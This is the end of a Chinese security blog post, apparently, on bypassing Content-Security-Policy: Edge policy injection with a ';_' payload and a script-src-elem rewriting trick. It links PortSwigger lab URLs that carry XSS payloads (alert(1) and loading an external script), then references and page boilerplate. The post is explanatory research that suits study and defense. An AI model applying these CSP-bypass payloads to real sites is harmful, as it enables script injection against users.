+
+<p><code>test;_</code>是能够控制的内容。当CSP语句被破坏时，Edge浏览器会放弃整个CSP策略。</p>
+<p>文章中给了一个很短的payload：<code>;_</code></p>
+<p>实例地址：<a target="_blank" rel="noopener" href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E%5D(http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a>)</p>
+<ul>
+<li>script-src-elem重写规则绕过</li>
+</ul>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src-elem &#39;none&#39;; script-src-attr &#39;unsafe-inline&#39;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;This will be blocked&quot;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;#&quot; onclick&#x3D;&quot;alert(&#39;This will be allowed&#39;)&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实例地址：<a target="_blank" rel="noopener" href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;script-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E">script-src-elem重写规则绕过</a></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/08/08/ccsp/#%E4%BB%80%E4%B9%88%E6%98%AFCSP">CSP Level 3浅析&amp;简单的bypass</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/bypassing-csp-with-policy-injection">Bypassing CSP with policy injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html">csp学习</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/318/">初探CSPBypass一些细节总结</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7372">csp绕过姿势</a></li>
+</ul>
+<p>两个方便CSP测试的网址：</p>
+<ul>
+<li>CSP生成：<a target="_blank" rel="noopener" href="https://www.cspisawesome.com/">https://www.cspisawesome.com/</a></li>
+<li>CSP分析：<a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></li>
+</ul>
+<p>总结是永远总结不完的，这里只贴地址了：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7530">如何将JavaScript隐藏在PNG图像中来绕过CSP</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7108">CSP:trusted-types 初体验</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
